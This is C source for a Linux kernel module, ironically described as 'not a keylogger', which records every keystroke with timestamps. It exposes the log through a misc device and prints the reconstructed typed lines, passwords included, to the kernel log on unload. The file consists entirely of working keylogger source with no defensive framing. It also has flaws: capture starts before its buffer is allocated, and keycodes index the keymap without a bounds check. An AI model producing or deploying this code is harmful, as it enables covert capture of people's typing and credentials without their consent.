// SPDX-License-Identifier: GPL-3.0-only
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/mutex.h>
#include <linux/interrupt.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Romain Kowalski");
MODULE_DESCRIPTION("Absolutely not a keylogger.");

#define MODULE_NAME "not_a_keylogger"
#define DEVICE_NAME "definitely_not_key_logs"
#define PRESSED 1
#define RELEASED 0
#define LINE_SIZE 50
#define FULL_NAME_SIZE 20

struct	key_stroke {
	unsigned int		keycode;
	unsigned char		keysym;
	char			full_name[FULL_NAME_SIZE];
	bool			pressed; // 1 = pressed, 0 = released
	ktime_t			time;
};

static const char	*us_keymap[][2] = {
	{"\0", "\0"}, {"ESCAPE", "ESCAPE"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"BACKSPACE", "BACKSPACE"}, {"TAB", "TAB"},
	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"ENTER", "ENTER"}, {"CTRL L", "CTRL L"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {"SHIFT L", "SHIFT L"}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {"SHIFT R", "SHIFT R"}, {"KP *", "KP PRINT SCREEN"},
	{"ALT L", "ALT L"}, {"SPACE", "SPACE"}, {"CAPS LOCK", "CAPS LOCK"},
	{"F1", "F1"}, {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, {"F10", "F10"},
	{"NUM", "NUM"}, {"SCROLL", "SCROLL"}, {"KP 7", "HOME"},
	{"KP 8", "KP UP"}, {"KP 9", "KP PAGE UP"}, {"-", "-"}, {"KP 4", "KP LEFT"},
	{"KP 5", "KP 5"}, {"KP 6", "KP RIGHT"}, {"+", "+"}, {"KP 1", "KP END"},
	{"KP 2", "KP DOWN"}, {"KP 3", "KP PAGE DOWN"}, {"KP 0", "KP INSERT"},
	{"KP .", "KP DELETE"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"},
	{"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"ENTER", "ENTER"}, {"CTRL R", "CTRL R"}, {"/", "/"}, {"PRTSCR", "PRTSCR"},
	{"ALT R", "ALT R"}, {"\0", "\0"}, {"HOME", "HOME"}, {"UP", "UP"},
	{"PAGE UP", "PAGE UP"}, {"LEFT", "LEFT"}, {"RIGHT", "RIGHT"},
	{"END", "END"}, {"DOWN", "DOWN"}, {"PAGE DOWN", "PAGE DOWN"},
	{"INSERT", "INSERT"}, {"DELETE", "DELETE"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"PAUSE", "PAUSE"},
};

static size_t			captured_size;
static size_t			captured_max_size;
static struct key_stroke	*captured_keys;
static char			*log_file;
static struct mutex		log_mutex; // for log_file
static struct mutex		keys_mutex; // for captured_keys

static int	ktime_to_hours(ktime_t time)
{
	int	hours;

	hours = time / 1000000000; // seconds
	hours /= 60; // minutes
	hours /= 60; // hours
	hours = hours % 24;
	return hours;
}

static int	ktime_to_minutes(ktime_t time)
{
	int	minutes;

	minutes = time / 1000000000; // seconds
	minutes /= 60; // minutes
	minutes = minutes % 60;
	return minutes;
}

static int	ktime_to_seconds(ktime_t time)
{
	int	seconds;

	seconds = time / 1000000000; // seconds
	seconds = seconds % 60; // minutes
	return seconds;
}

static void	key_stroke_to_buffer(struct key_stroke entry, char *buffer,
					size_t len)
{
	int	hours;
	int	minutes;
	int	seconds;
	char	format[] = "[%2d:%02d:%02d] %s (%d) %s\n";

	hours = ktime_to_hours(entry.time);
	minutes = ktime_to_minutes(entry.time);
	seconds = ktime_to_seconds(entry.time);
	snprintf(buffer, len, format, hours, minutes, seconds, entry.full_name,
		entry.keycode, (entry.pressed ? "Pressed" : "Released"));
}

static int	handle_keycode(struct keyboard_notifier_param *param)
{
	mutex_lock(&keys_mutex);
	if (captured_size == captured_max_size) {
		captured_keys = krealloc_array(captured_keys,
						captured_max_size * 2,
						sizeof(struct key_stroke),
						GFP_KERNEL);
		if (!captured_keys) {
			mutex_unlock(&keys_mutex);
			return NOTIFY_BAD;
		}
		captured_max_size *= 2;
	}
	captured_keys[captured_size].keycode = param->value;
	captured_keys[captured_size].pressed = param->down;
	captured_keys[captured_size].time = ktime_get_real();
	mutex_unlock(&keys_mutex);
	return NOTIFY_OK;
}

static int	handle_keysym(struct keyboard_notifier_param *param)
{
	char	c;
	int	shift = 0;

	if (param->shift == 1)
		shift = 1;
	c = param->value;
	mutex_lock(&keys_mutex);
	captured_keys[captured_size].keysym = c;
	if (c >= 33 && c <= 126) {
		snprintf(captured_keys[captured_size].full_name, FULL_NAME_SIZE,
			"%c", c);
	} else {
		strscpy(captured_keys[captured_size].full_name,
			us_keymap[captured_keys[captured_size].keycode][shift],
			FULL_NAME_SIZE);
	}
	captured_size++;
	mutex_unlock(&keys_mutex);
	return NOTIFY_OK;
}

static int	key_pressed(struct notifier_block *self, unsigned long action,
				void *data)
{
	if (action == KBD_KEYCODE)
		return handle_keycode(data);
	else if (action == KBD_KEYSYM)
		return handle_keysym(data);
	return NOTIFY_DONE;
}

static struct notifier_block	nb = {
	.notifier_call = &key_pressed,
	.priority = 0,
	.next = NULL,
};

static int	next_return(int start)
{
	while (start < captured_size && ((captured_keys[start].keycode != 96 &&
					captured_keys[start].keycode != 28) ||
					!captured_keys[start].pressed))
		start++;
	return start;
}

static void	fill_line(char *line, int start, int end)
{
	int	i = 0;

	while (start < end) {
		if (captured_keys[start].keysym >= 32
				&& captured_keys[start].keysym <= 126
				&& captured_keys[start].pressed) {
			line[i] = captured_keys[start].keysym;
			i++;
		}
		start++;
	}
	line[i] = '\0';
}

static void	print_readable(void)
{
	int	start = 0;
	int	end = 0;
	char	*line = NULL;

	pr_info("Full readable logs:");
	while (end < captured_size) {
		end = next_return(start);
		line = kmalloc(end - start + 1, GFP_KERNEL);
		if (!line) {
			pr_err("%s: kmalloc error", MODULE_NAME);
			return;
		}
		fill_line(line, start, end);
		if (strlen(line))
			pr_info("%s", line);
		kfree(line);
		end++;
		start = end;
	}
}

static ssize_t	logs_read(struct file *filp, char __user *buffer, size_t len,
				loff_t *offset)
{
	int	ret = 0;

	mutex_lock(&log_mutex);
	if (log_file)
		ret = simple_read_from_buffer(buffer, len, offset, log_file,
						strlen(log_file));
	mutex_unlock(&log_mutex);
	return ret;
}

static int	logs_open(struct inode *inode, struct file *file)
{
	int	log_len;
	char	line[LINE_SIZE];
	int	i;

	try_module_get(THIS_MODULE);
	mutex_lock(&log_mutex);
	kfree(log_file);
	log_len = 0;
	i = 0;
	while (i < captured_size) {
		key_stroke_to_buffer(captured_keys[i], line, LINE_SIZE);
		if (log_file)
			log_len = strlen(log_file);
		log_file = krealloc_array(log_file, log_len + strlen(line) + 1,
						sizeof(char), GFP_KERNEL);
		if (!log_file) {
			mutex_unlock(&log_mutex);
			pr_err("%s: krealloc_array error\n", MODULE_NAME);
			return 1;
		}
		if (log_len == 0)
			log_len = strscpy(log_file, line, strlen(line) + 1);
		else
			strncat(log_file, line, strlen(line));
		i++;
	}
	mutex_unlock(&log_mutex);
	return 0;
}

static int	logs_close(struct inode *inode, struct file *file)
{
	if (module_refcount(THIS_MODULE) == 1) {
		mutex_lock(&log_mutex);
		kfree(log_file);
		log_file = NULL;
		mutex_unlock(&log_mutex);
	}
	module_put(THIS_MODULE);
	return 0;
}

static struct file_operations	logs_fops = {
	.open = &logs_open,
	.release = &logs_close,
	.read = &logs_read,
};

static struct miscdevice	logs_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = DEVICE_NAME,
	.fops = &logs_fops
};

static int	__init kl_init(void)
{
	int	ret;

	ret = misc_register(&logs_device);
	if (ret) {
		pr_err("%s: Loading module failed\n", MODULE_NAME);
		return -ret;
	}
	pr_info("%s: Module loaded\n", MODULE_NAME);
	ret = register_keyboard_notifier(&nb);
	if (ret) {
		misc_deregister(&logs_device);
		pr_err("%s: Registering keyboard notifier failed\n",
			MODULE_NAME);
		return -ret;
	}
	captured_max_size = 10;
	captured_keys = kmalloc_array(captured_max_size,
					sizeof(struct key_stroke), GFP_KERNEL);
	if (!captured_keys) {
		misc_deregister(&logs_device);
		unregister_keyboard_notifier(&nb);
		return 1;
	}
	pr_info("%s: Keyboard notifier registered\n", MODULE_NAME);
	return 0;
}

static void	__exit kl_cleanup(void)
{
	print_readable();
	misc_deregister(&logs_device);
	kfree(log_file);
	kfree(captured_keys);
	if (unregister_keyboard_notifier(&nb))
		pr_err("%s: Error when unregistering keyboard notifier\n",
			MODULE_NAME);
	else
		pr_info("%s: Keyboard notifier unregistered\n", MODULE_NAME);
	pr_info("%s: Module unloaded\n", MODULE_NAME);
}

module_init(kl_init);
module_exit(kl_cleanup);
